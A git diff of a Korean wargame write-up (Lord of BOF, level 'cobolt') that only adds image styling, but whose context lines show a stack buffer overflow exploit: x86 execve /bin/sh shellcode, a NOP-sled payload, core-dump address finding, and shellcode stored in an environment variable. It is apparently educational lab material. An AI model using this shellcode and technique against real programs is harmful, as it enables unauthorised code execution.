@@ -65,7 +65,7 @@ argv[1]의 값을 buffer배열로 복사할때 복사되는 크기가 정해져�
 shell(24byte) = \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80
 ```
 
-<img src="http://eliez3r.synology.me/assets/img/writeup/lob/02.cobolt/image-20180827223605161.png" width="500px">
+<img src="http://eliez3r.synology.me/assets/img/writeup/lob/02.cobolt/image-20180827223605161.png" width="500px">{:.rounded.shadow}
 
 위 그림처럼 buffer배열과 SFP는 쓰레기 값을 넣고, RET에는 RET 다음 주소를 가리키게 한 뒤 해당 공간에 shellcode를 넣는다.
 
@@ -73,7 +73,7 @@ shell(24byte) = \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50
 
 shellcode가 들어가는 주소를 알기 위해 core dump를 만들자.
 
-<img src="http://eliez3r.synology.me/assets/img/writeup/lob/02.cobolt/image-20180827225219317.png" width="800px">
+<img src="http://eliez3r.synology.me/assets/img/writeup/lob/02.cobolt/image-20180827225219317.png" width="900px">{:.rounded.shadow}
 
 ```shell
 $ ./aobolt `python -c 'print "A"*16+"BBBB"+"CCCC"+"\x90"*50+"S"*24'`
@@ -83,14 +83,14 @@ $ ./aobolt `python -c 'print "A"*16+"BBBB"+"CCCC"+"\x90"*50+"S"*24'`
 
 <br>
 
-<img src="http://eliez3r.synology.me/assets/img/writeup/lob/02.cobolt/image-20180827225429938.png" width="800px">
+<img src="http://eliez3r.synology.me/assets/img/writeup/lob/02.cobolt/image-20180827225429938.png" width="800px">{:.rounded.shadow}
 
 core dump를 살펴보면 우리가 **shellcode를 넣을 공간은 "S"(\x53)가 들어간 공간**이다. NOP를 넣은 이유는 NOP Sliding을 이용하여 쉽게 shellcode에 접근하기 위함으로 NOP(\x90)이 있는 주소 아무곳을 RET주소에 넣으면 NOP를 따라 내려가다가 shellcode를 만나 실행하게 된다.
 
 RET주소에 대략 `0xbffffa6c` 주소 언저리를 넣어주면 될 것 같다.
 
 
-<img src="http://eliez3r.synology.me/assets/img/writeup/lob/02.cobolt/image-20180827225615182.png" width="800px">
+<img src="http://eliez3r.synology.me/assets/img/writeup/lob/02.cobolt/image-20180827225615182.png" width="800px">{:.rounded.shadow}
 
 
 -----
@@ -99,7 +99,7 @@ RET주소에 대략 `0xbffffa6c` 주소 언저리를 넣어주면 될 것 같다
 
 linux 시스템에는 환경변수라는 것이 존재한다. `export` 명령어를 치면 환경변수들이 나타나게 되는데, 이러한 변수들이 프로그램이 동작할 때 마다 스택에 쌓여 하나의 변수처럼 사용되게 된다.
 
-<img src="http://eliez3r.synology.me/assets/img/writeup/lob/02.cobolt/image-20180827225742065.png" width="600px">
+<img src="http://eliez3r.synology.me/assets/img/writeup/lob/02.cobolt/image-20180827225742065.png" width="600px">{:.rounded.shadow}
 
 <br>
 
@@ -113,7 +113,7 @@ $ gdb -q aobolt
 (gdb) x/32s $ebp+291
 ```
 
-<img src="http://eliez3r.synology.me/assets/img/writeup/lob/02.cobolt/image-20180827230447465.png" width="600px">
+<img src="http://eliez3r.synology.me/assets/img/writeup/lob/02.cobolt/image-20180827230447465.png" width="600px">{:.rounded.shadow}
 
 cobolt를 복사한 abolt 파일을 기준으로 ebp+281부분부터 보게되면 환경변수들이 스택에 쌓여 있는 것을 볼 수 있다.
 
@@ -123,7 +123,7 @@ cobolt를 복사한 abolt 파일을 기준으로 ebp+281부분부터 보게되�
 
 <br>
 
-<img src="http://eliez3r.synology.me/assets/img/writeup/lob/02.cobolt/image-20180827230946829.png" width="600px">
+<img src="http://eliez3r.synology.me/assets/img/writeup/lob/02.cobolt/image-20180827230946829.png" width="600px">{:.rounded.shadow}
 
 환경변수를 추가하는 방법은 아래 명령어를 이용하여 추가 할 수 있다.
 ```shell
@@ -141,7 +141,7 @@ $ gdb -q aobolt
 ```
 <br>
 
-<img src="http://eliez3r.synology.me/assets/img/writeup/lob/02.cobolt/image-20180827231211347.png" width="600px">
+<img src="http://eliez3r.synology.me/assets/img/writeup/lob/02.cobolt/image-20180827231211347.png" width="600px">{:.rounded.shadow}
 
 환경변수가 추가되어 스택의 주소가 약간 변동이 있지만, 정상적으로 `shellcode` 환경변수가 스택에 들어가 있음을 알 수 있다.
 
@@ -157,7 +157,7 @@ shell(24byte) = \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50
 ```shell
 $ export shellcode=`python -c 'print "\x90"*50+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"'`
 ```
-<img src="http://eliez3r.synology.me/assets/img/writeup/lob/02.cobolt/image-20180827231441368.png" width="900px">
+<img src="http://eliez3r.synology.me/assets/img/writeup/lob/02.cobolt/image-20180827231441368.png" width="900px">{:.rounded.shadow}
 
 NOP 50byte와 shellcode를 `shellcode` 라는 환경변수에 넣었다.
 
